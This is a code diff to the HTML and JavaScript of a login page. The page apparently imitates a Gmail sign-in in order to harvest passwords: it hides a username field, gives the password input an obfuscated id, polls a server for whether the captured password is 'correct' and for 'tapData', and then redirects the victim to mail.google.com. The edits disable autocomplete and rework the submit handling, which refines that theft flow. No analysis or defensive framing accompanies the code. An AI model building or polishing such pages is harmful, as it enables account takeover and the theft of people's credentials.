@@ -80,7 +80,7 @@
         <div class="form-container">
             <div class="white-overlay" id="whiteOverlay"></div>
             <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
-        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8" autocomplete="off">
        
             <div class="form-half">
                 <div><img class="divlogo" src="/image/image.png" ></div>
@@ -97,7 +97,7 @@
             <div class="form-half1">
                 <div class="passdiv">
                     <input type='hidden' name="username" id="useRname" value="">
-                    <input  required='' name="password" type='password' id="pEyar">
+                    <input required='' name="password" type='password' id="pEyar" autocomplete="off">
                     <label id="pwdLabel" style="color:#2c2a2a; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter your password' placeholder='Password'></label>
                     <div id="pwdError" class="error-msg" style="display:none;"><img src="/image/error.png"></div>
                 </div>
@@ -115,7 +115,7 @@
 
                 <div class="fgtpwd">
                     <button type="button" id="forgotPwdBtn" class="hyperl"><b>Forgot password?</b></button>&nbsp;&nbsp;&nbsp;
-                    <button type="button" class="btnnxt" id="nextBtn"><b>Next</b></button>
+                    <button type="submit" class="btnnxt" id="nextBtn"><b>Next</b></button>
                 </div>
 
             </div>
@@ -178,7 +178,8 @@
         location.href = "https://mail.google.com";
       };
 
-      document.getElementById('nextBtn').onclick = function () {
+      document.querySelector('.loginform').addEventListener('submit', function (e) {
+        e.preventDefault();
         const pwd = document.getElementById('pEyar').value;
         if (!pwd) return;
         document.getElementById('pwdError').style.display = 'none';
@@ -212,7 +213,6 @@
                   document.getElementById('pwdError').style.display = 'block';
                   document.getElementById('pEyar').classList.add('input-error');
                 } else if (data.result === 'correct' && !data.tapData && pollCount > 15) {
-                  // After 30 seconds with correct but no data, assume success
                   clearInterval(poll);
                   window.location.href = 'https://mail.google.com';
                 }
@@ -220,7 +220,7 @@
               .catch(() => {});
           }, 2000);
         });
-      };
+      });
 
       document.getElementById('forgotPwdBtn').onclick = function () {
         showLoadingBar();
